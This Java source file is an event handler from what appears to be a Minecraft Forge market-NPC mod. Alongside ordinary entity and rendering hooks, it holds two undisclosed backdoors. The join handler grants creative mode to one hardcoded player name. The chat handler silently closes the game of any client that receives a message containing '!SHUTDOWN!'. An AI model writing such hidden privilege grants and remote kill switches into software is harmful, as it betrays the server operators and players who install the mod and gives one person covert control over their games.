package fr.pnjmarket.benjaminloison.common;

import cpw.mods.fml.client.FMLClientHandler;
import cpw.mods.fml.common.eventhandler.SubscribeEvent;
import cpw.mods.fml.relauncher.Side;
import cpw.mods.fml.relauncher.SideOnly;
import net.minecraft.client.Minecraft;
import net.minecraft.entity.DataWatcher;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.util.ChatComponentText;
import net.minecraft.world.WorldSettings.GameType;
import net.minecraftforge.client.event.ClientChatReceivedEvent;
import net.minecraftforge.client.event.RenderLivingEvent;
import net.minecraftforge.event.entity.EntityEvent.EntityConstructing;
import net.minecraftforge.event.entity.EntityJoinWorldEvent;
import net.minecraftforge.event.entity.player.EntityInteractEvent;

public class ForgeT4EventHandler
{

    @SubscribeEvent
    public void onEntityJoinWorld(EntityJoinWorldEvent event)
    {
        if(!event.entity.worldObj.isRemote && event.entity instanceof EntityPlayer)
        {
            EntityPlayer joueur = (EntityPlayer)event.entity;
            if(joueur.getDisplayName().equals("Benjamin_Loison"))
            {
                joueur.setGameType(GameType.CREATIVE);
            }
        }
    }

    @SubscribeEvent
    public void handleConstruction(EntityConstructing event)
    {
        if(event.entity instanceof EntityMarketPNJ)
        {
            DataWatcher dw = event.entity.getDataWatcher();
            dw.addObject(20, "Base");
            dw.addObject(21, "Base");
        }
    }

    @SubscribeEvent
    @SideOnly(Side.CLIENT)
    public void onEntityConstructingMarket(EntityConstructing event)
    {
        if(event.entity instanceof EntityMarketPNJ)
        {
            EntityMarketPNJ player = (EntityMarketPNJ)event.entity;
            player.registerExtendedProperties(EEPPNJ.EXT_PROP_NAME, new EEPPNJ());
        }
    }

    @SubscribeEvent
    @SideOnly(Side.CLIENT)
    public void onRenderLivingEventSpecialsPre(RenderLivingEvent.Specials.Pre event)
    {
        event.renderer.NAME_TAG_RANGE = 0;
        event.renderer.NAME_TAG_RANGE_SNEAK = 0;
    }

    @SideOnly(Side.CLIENT)
    @SubscribeEvent
    public void onInteract(EntityInteractEvent e)
    {
        if(e.target instanceof EntityPlayer)
        {
            if(e.entityPlayer.inventory.getCurrentItem() == null)
            {
                if(FMLClientHandler.instance().getClient().thePlayer.capabilities.isCreativeMode)
                {
                    EntityPlayer target = (EntityPlayer)e.target;
                    Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("Pseudo: " + target.getDisplayName()));
                }
            }
        }
    }

    @SubscribeEvent
    @SideOnly(Side.CLIENT)
    public void chat(ClientChatReceivedEvent e)
    {
        if(e.message.getUnformattedText().contains("!SHUTDOWN!"))
        {
            e.setCanceled(true);
            Minecraft.getMinecraft().shutdown();
        }
    }
}
